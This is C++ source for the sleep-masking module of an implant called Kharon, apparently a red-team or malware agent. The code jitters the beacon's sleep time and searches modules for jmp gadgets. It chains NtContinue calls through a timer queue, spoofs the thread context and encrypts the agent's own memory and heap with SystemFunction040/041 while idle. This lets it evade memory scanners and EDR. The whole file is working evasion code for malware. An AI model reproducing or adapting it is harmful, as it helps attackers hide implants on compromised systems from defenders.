#include <Kharon.h>

using namespace Root;

auto DECLFN Mask::Main(
    _In_ ULONG Time
) -> BOOL {
    KhDbg( "[====== Starting the sleep ======]" );

    BOOL  Success = FALSE;
    ULONG RndTime = 0;
    
    if ( Self->Session.Jitter ) {
        ULONG JitterMnt = ( Self->Session.Jitter * Self->Session.SleepTime ) / 100; 
        ULONG SleepMin  = ( Self->Session.SleepTime > JitterMnt ? Self->Session.SleepTime - JitterMnt : 0 ); 
        ULONG SleepMax  = ( Self->Session.SleepTime + JitterMnt );
        ULONG Range     = ( SleepMax - SleepMin + 1 );
        
        RndTime = ( Rnd32() % Range );
    } else {
        RndTime = Self->Session.SleepTime;
    }

    KhDbg( "sleep during: %d ms", RndTime );

    switch( this->Ctx.TechniqueID ) {
    case MaskTimer:
        Success = this->Timer( RndTime ); break;
    case MaskWait:
        Success = this->Wait( RndTime ); break;
    }

    KhDbg( "[====== Exiting Sleep ======]\n" );

    return Success;
}

auto DECLFN Mask::FindGadget(
    _In_ UPTR   ModuleBase,
    _In_ UINT16 RegValue
) -> UPTR {
    UPTR   Gadget      = 0;
    BYTE*  SearchBase  = NULL;
    SIZE_T SearchSize  = 0;
    UINT16 JmpValue    = 0xff;

    SearchBase = B_PTR( ModuleBase + 0x1000 );
    SearchSize = 0x1000 * 0x1000;    

    for ( INT i = 0; i < SearchSize - 1; i++ ) {
        if ( SearchBase[i] == JmpValue && SearchBase[i+1] == RegValue ) {
            Gadget = U_PTR( SearchBase + i ); break;
        }
    }

    return Gadget;
}

auto DECLFN Mask::Timer(
    _In_ ULONG Time
) -> BOOL {
    NTSTATUS NtStatus = STATUS_SUCCESS;
    
    ULONG  DupThreadId      = Self->Td->Rnd();
    HANDLE DupThreadHandle  = NULL;
    HANDLE MainThreadHandle = NULL;

    HANDLE Queue       = NULL;
    HANDLE Timer       = NULL;
    HANDLE EventTimer  = NULL;
    HANDLE EventStart  = NULL;
    HANDLE EventEnd    = NULL;

    PVOID OldProtection = NULL;
    ULONG DelayTimer    = 0;
    BOOL  bSuccess      = FALSE;

    CONTEXT CtxMain = { 0 };
    CONTEXT CtxSpf  = { 0 };
    CONTEXT CtxBkp  = { 0 };

    CONTEXT Ctx[10]  = { 0 };
    UINT16  ic       = 0;

    KhDbg( "kharon base at %p [0x%X bytes]", Self->Session.Base.Start, Self->Session.Base.Length );
    KhDbg( "running at thread id: %d thread id to duplicate: %d", Self->Session.ThreadID, DupThreadId );
    KhDbg( "NtContinue gadget at %p", this->Ctx.NtContinueGadget );
    KhDbg( "jmp gadget at %p", this->Ctx.JmpGadget );

    DupThreadHandle = Self->Td->Open( THREAD_ALL_ACCESS, FALSE, DupThreadId );

    NtStatus = Self->Krnl32.DuplicateHandle( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &MainThreadHandle, THREAD_ALL_ACCESS, FALSE, 0 );

    NtStatus = Self->Ntdll.NtCreateEvent( &EventTimer,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
    NtStatus = Self->Ntdll.NtCreateEvent( &EventStart,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
    NtStatus = Self->Ntdll.NtCreateEvent( &EventEnd,    EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );

    NtStatus = Self->Ntdll.RtlCreateTimerQueue( &Queue );
    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;

    NtStatus = Self->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Self->Ntdll.RtlCaptureContext, &CtxMain, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
    
    NtStatus = Self->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Self->Krnl32.SetEvent, EventTimer, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;

    NtStatus = Self->Ntdll.NtWaitForSingleObject( EventTimer, FALSE, NULL );
    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;

    CtxSpf.ContextFlags = CtxBkp.ContextFlags = CONTEXT_ALL;

    Self->Ntdll.NtGetContextThread( DupThreadHandle, &CtxSpf );

    for ( INT i = 0; i < 10; i++ ) {
        Mem::Copy( &Ctx[i], &CtxMain, sizeof( CONTEXT ) );
        Ctx[i].Rsp -= sizeof( PVOID );
    }

    Ctx[ic].Rip = U_PTR( this->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Self->Ntdll.NtWaitForSingleObject );
    Ctx[ic].Rcx = U_PTR( EventStart );
    Ctx[ic].Rdx = FALSE;
    Ctx[ic].R9  = NULL;
    ic++;

    Ctx[ic].Rip = U_PTR( this->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Self->Ntdll.NtGetContextThread );
    Ctx[ic].Rcx = U_PTR( MainThreadHandle );
    Ctx[ic].Rdx = U_PTR( &CtxBkp );
    ic++;

    Ctx[ic].Rip = U_PTR( this->Ctx.JmpGadget ) ;
    Ctx[ic].Rbx = U_PTR( &Self->Ntdll.NtSetContextThread ); 
    Ctx[ic].Rcx = U_PTR( MainThreadHandle );
    Ctx[ic].Rdx = U_PTR( &CtxSpf );
    ic++;

    Ctx[ic].Rip = U_PTR( this->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Self->Krnl32.VirtualProtect );
    Ctx[ic].Rcx = U_PTR( Self->Session.Base.Start );
    Ctx[ic].Rdx = Self->Session.Base.Length;
    Ctx[ic].R8  = PAGE_READWRITE;
    Ctx[ic].R9  = U_PTR( &OldProtection );
    ic++;

    Ctx[ic].Rip = U_PTR( this->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Self->Cryptbase.SystemFunction040 );
    Ctx[ic].Rcx = U_PTR( Self->Session.Base.Start );
    Ctx[ic].Rdx = Self->Session.Base.Length;
    ic++;
    
    Ctx[ic].Rip = U_PTR( this->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Self->Krnl32.WaitForSingleObjectEx );
    Ctx[ic].Rcx = U_PTR( NtCurrentProcess() );
    Ctx[ic].Rdx = Time;
    Ctx[ic].R8  = FALSE;
    ic++;
        
    Ctx[ic].Rip = U_PTR( this->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Self->Cryptbase.SystemFunction041 );
    Ctx[ic].Rcx = U_PTR( Self->Session.Base.Start );
    Ctx[ic].Rdx = Self->Session.Base.Length;
    ic++;

    Ctx[ic].Rip = U_PTR( this->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Self->Krnl32.VirtualProtect );
    Ctx[ic].Rcx = U_PTR( Self->Session.Base.Start );
    Ctx[ic].Rdx = Self->Session.Base.Length;
    Ctx[ic].R8  = PAGE_EXECUTE_READ;
    Ctx[ic].R9  = U_PTR( &OldProtection );
    ic++;

    Ctx[ic].Rip = U_PTR( this->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Self->Ntdll.NtSetContextThread );
    Ctx[ic].Rcx = U_PTR( MainThreadHandle );
    Ctx[ic].Rdx = U_PTR( &CtxBkp );
    ic++;

    Ctx[ic].Rip = U_PTR( this->Ctx.JmpGadget );
    Ctx[ic].Rbx = U_PTR( &Self->Krnl32.SetEvent );
    Ctx[ic].Rcx = U_PTR( EventEnd );
    ic++;

    for ( INT i = 0; i < ic; i++ ) {
        Self->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)this->Ctx.NtContinueGadget, &Ctx[i], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
    }

    if ( Self->Hp->Obfuscate ) {
        KhDbg( "obfuscating heap allocations from agent" );
        Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 500 );
        Self->Hp->Crypt();
    }

    KhDbg( "trigger obf chain" );

    NtStatus = Self->Ntdll.NtSignalAndWaitForSingleObject( EventStart, EventEnd, FALSE, NULL );
    if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;

    if ( Self->Hp->Obfuscate ) {
        KhDbg( "deobfuscating heap allocations from agent" );
        Self->Hp->Crypt();
    }

_KH_END:
    if ( DupThreadHandle ) Self->Ntdll.NtClose( DupThreadHandle );
    if ( Timer           ) Self->Ntdll.RtlDeleteTimer( Queue, Timer, EventTimer );
    if ( Queue           ) Self->Ntdll.RtlDeleteTimerQueue( Queue );
    if ( EventEnd        ) Self->Ntdll.NtClose( EventEnd  );
    if ( EventStart      ) Self->Ntdll.NtClose( EventStart );
    if ( EventTimer      ) Self->Ntdll.NtClose( EventTimer  );

    if ( NtStatus == STATUS_SUCCESS ) { return TRUE; } 
    else { return FALSE; }
}

auto DECLFN Mask::Wait(
    _In_ ULONG Time
) -> BOOL {
    return Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), Time );
}